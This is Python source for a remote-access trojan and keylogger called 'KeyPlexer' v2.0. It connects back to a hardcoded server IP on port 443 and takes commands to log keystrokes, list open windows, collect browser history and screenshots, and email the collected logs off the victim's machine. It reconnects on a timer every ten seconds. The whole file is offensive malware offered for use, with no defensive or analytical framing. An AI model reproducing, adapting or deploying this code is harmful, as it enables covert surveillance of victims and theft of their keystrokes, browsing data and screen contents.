#!/usr/bin/python

from modules.keylogging import *
from modules.Settings import *
from modules.check_connection import *
from modules.get_history import *
from modules.find_ip import *
from modules.paths import *
from modules.menu import *
from modules.screenshots import *
import subprocess
import time
import socket


"""This is reverse shell that connects
   to the backdoor server
   and keyloggs as well"""

"""
Name:
Date :
Version : v2.0
 _  __             ____   _                        
| |/ / ___  _   _ |  _ \ | |  ___ __  __ ___  _ __ 
| ' / / _ \| | | || |_) || | / _ \\ \/ // _ \| '__|
| . \|  __/| |_| ||  __/ | ||  __/ >  <|  __/| |   
|_|\_\\___| \__, ||_|    |_| \___|/_/\_\\___||_|   
            |___/
            
          ooo,    .---.
         o`  o   /    |\________________
        o`   'oooo()  | ________   _   _)
        `oo   o` \    |/        | | | |
          `ooo'   `---'         "-" |_|
"""


host = '10.0.0.106' #
#host = '147.9.118.130'
port = 443


def connect_client_side():

    global host, port

    # threading.Timer(6,connect_client_side).start()
    
    # create a socket object
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # connect to sock
    sock.connect((host, port))
          
    while True:

        # wait for the server for more commands
        user_command = sock.recv(1024)
        
        # if the server sends ":kill" command, stop the shell
        if user_command.strip() == ':kill':
            sock.send("Connection is shutting down ..................\n\n")
            sock.close()
            break
             
        # start logging using Keylog command
        elif user_command.strip() == 'Keylog':
            sock.send("[*] Keylogging is on ........\n\n")
            begin_logging()
            sock.send("\n\n\n")

        # get open windows
        elif user_command.strip() == 'Openwins':
            sock.send("[*] Getting all the open programs \n\n")
            get_all_open_windows()
            sock.send("\n\n\n")

        # get users IP
        elif user_command.strip() == 'IP':
            sock.send("[*] Getting all the open programs \n\n")
            sock.send(get_ip())
            sock.send("\n\n\n")

        # get browser history #CPU run wild !!! needs fixing
        elif user_command.strip() == 'History':
             sock.send("[*] Gathering browser history\n\n")
             get_all_history()
             sock.send("[*] History is saved on the victim machine. type send to get it by email\n\n")
             sock.send("\n\n\n")


        # send the logs via email
        elif user_command.strip() == 'Sendlogs':
             sock.send("[*] Starting to send the logs............................ \n\n")
             send_new_email(folder_path)
             sock.send("[*] Check the mail for the logs..........................\n")
             sock.send("\n\n")

        # capture screenshots
        elif user_command.strip() == 'Capture':
             sock.send("[*] Start capturing the images............................ \n\n")
             capture_screenshots(screen_shots)
             sock.send("\n\n")
            
            
        else:

            sock.send("\n [*] ERROR: Entered Wrong Command. Type [Menu] to get the list of commands\n\n")  
        
    

def shell():

    threading.Timer(10, shell).start()
    
    # check the connection
    conn = get_current_connection()
    
    if conn == True:
         connect_client_side()
    else:
         begin_logging()
    
         

def main():

    # start the shell
    shell()
    


if __name__ == "__main__" :

        main()


# TODO:
# Sanitize the loggs
# Handle closing sockets properly

